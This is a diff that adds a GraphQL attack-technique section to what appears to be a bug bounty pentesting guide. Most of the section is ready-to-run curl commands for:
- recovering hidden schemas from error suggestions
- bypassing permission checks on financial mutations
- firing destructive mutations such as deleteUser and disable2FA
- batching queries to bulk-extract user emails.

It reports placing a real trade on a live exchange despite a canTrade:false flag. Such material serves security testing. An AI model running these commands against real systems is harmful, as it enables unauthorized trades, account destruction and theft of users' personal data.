@@ -571,3 +571,159 @@ any authenticated user to read any other user via the Relay
 - https://graphql.security/
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
 - https://portswigger.net/web-security/graphql
+
+---
+
+## Battle-Tested GraphQL Techniques (2026)
+
+**Proven on: Bumba Exchange (13 findings, report submitted)**
+
+These techniques were discovered and validated during real bug bounty hunts in April 2026. They are not theoretical — they produced confirmed vulnerabilities and bounties.
+
+### 1. Error-Based Schema Discovery (Introspection Disabled)
+
+When introspection is blocked, the GraphQL engine still leaks field names through validation errors. Send intentionally wrong field names and harvest the "Did you mean X?" suggestions to reconstruct the full schema.
+
+```bash
+# Step 1: Probe with nonsense fields to trigger suggestions
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query":"{ usr }"}'
+# Response: "Did you mean 'user', 'users', 'userById'?"
+
+# Step 2: For each discovered field, probe its sub-fields
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user { nam } }"}'
+# Response: "Did you mean 'name', 'nameFirst', 'nameLast'?"
+
+# Step 3: Probe mutations the same way
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { creat }"}'
+# Response: "Did you mean 'createUser', 'createOrder', 'createDeposit'?"
+
+# Step 4: Iterate systematically — use a wordlist of common GraphQL field prefixes
+for PREFIX in get set update delete create list find add remove; do
+  curl -sk -X POST "https://$TARGET/graphql" \
+    -H "Content-Type: application/json" \
+    -d "{\"query\":\"mutation { ${PREFIX}X }\"}" 2>/dev/null \
+    | jq -r '.errors[].message' | grep -i "did you mean"
+done
+```
+
+This technique reconstructed 91 endpoints on Bumba Exchange where introspection was disabled.
+
+### 2. PERMS_GUARD Bypass Testing (Permission Decorator Gaps)
+
+GraphQL APIs often use permission decorators (e.g., `@PERMS_GUARD`, `@auth`, `@hasPermission`) on mutations. Developers frequently forget to add them to ALL mutations — test each one individually.
+
+```bash
+# Step 1: List all discovered mutations (from error-based discovery or schema)
+# Step 2: Test each mutation with a LOW-PRIVILEGE token
+
+# Example: user has canTrade:false but mutation lacks permission check
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
+  -d '{"query":"mutation { placeOrder(pair:\"BTC/USD\", side:BUY, amount:0.001, price:1) { id status } }"}'
+# If this succeeds → the mutation is missing its permission decorator
+
+# Test ALL mutations, not just the obvious ones
+# On Bumba: placeOrder, cancelOrder, createDeposit all lacked canTrade checks
+```
+
+### 3. Financial Mutation Permission Bypass (canTrade/canWithdraw)
+
+On financial platforms (exchanges, banks, trading apps), test if trading/withdrawal mutations respect the user's permission flags. Often the permission is checked on the frontend but NOT enforced on the GraphQL resolver.
+
+```bash
+# Step 1: Check your account permissions
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ me { canTrade canWithdraw kycStatus permissions } }"}'
+# Response shows canTrade: false
+
+# Step 2: Try trading anyway — the resolver may not check
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { placeMarketOrder(input: { pair: \"BTCUSD\", side: BUY, quantity: \"0.001\" }) { orderId status fillPrice } }"}'
+# On Bumba: This WORKED — placed a real market order on live BTC at $74K despite canTrade:false
+```
+
+This was rated CRITICAL — unauthorized trading on a live exchange.
+
+### 4. Destructive Mutations Without Confirmation Guards
+
+Test if destructive mutations (delete_user, closeAccount, revokeAllSessions) can execute without confirmation steps, 2FA, or re-authentication.
+
+```bash
+# Test delete_user / deactivateAccount
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { deleteUser { success } }"}'
+
+# Test revokeAllSessions (log out all devices)
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { revokeAllSessions { count } }"}'
+
+# Test disabling 2FA without current 2FA code
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { disable2FA { success } }"}'
+```
+
+### 5. Enum Value Discovery via Validation Errors
+
+GraphQL enums leak their valid values through validation errors when you send an invalid value.
+
+```bash
+# Send an invalid enum value
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { placeOrder(side: INVALID) { id } }"}'
+# Response: "Value 'INVALID' does not exist in 'OrderSide' enum. Did you mean BUY, SELL, STOP_LOSS, TAKE_PROFIT?"
+
+# Discover order types
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { placeOrder(type: X) { id } }"}'
+# Leaks: MARKET, LIMIT, STOP, OCO, TRAILING_STOP
+
+# Discover user roles
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ users(role: X) { id } }"}'
+# Leaks: USER, ADMIN, MODERATOR, SUPPORT, SUPERADMIN
+```
+
+### 6. Batch Query Complexity Bypass
+
+Some servers enforce query complexity limits per-query but not across batched requests. Send multiple simple queries in a batch to bypass complexity limits.
+
+```bash
+# Single complex query gets rejected:
+# "Query complexity 500 exceeds maximum of 100"
+
+# Split into 5 simple queries in a batch:
+cat > /tmp/batch-bypass.json <<'EOF'
+[
+  {"query":"{ users(first:100) { id email } }"},
+  {"query":"{ users(first:100, offset:100) { id email } }"},
+  {"query":"{ users(first:100, offset:200) { id email } }"},
+  {"query":"{ users(first:100, offset:300) { id email } }"},
+  {"query":"{ users(first:100, offset:400) { id email } }"}
+]
+EOF
+curl -sk -X POST "https://$TARGET/graphql" \
+  -H "Content-Type: application/json" \
+  --data-binary @/tmp/batch-bypass.json
+# Each query is under the limit, but combined they extract 500 records
+```
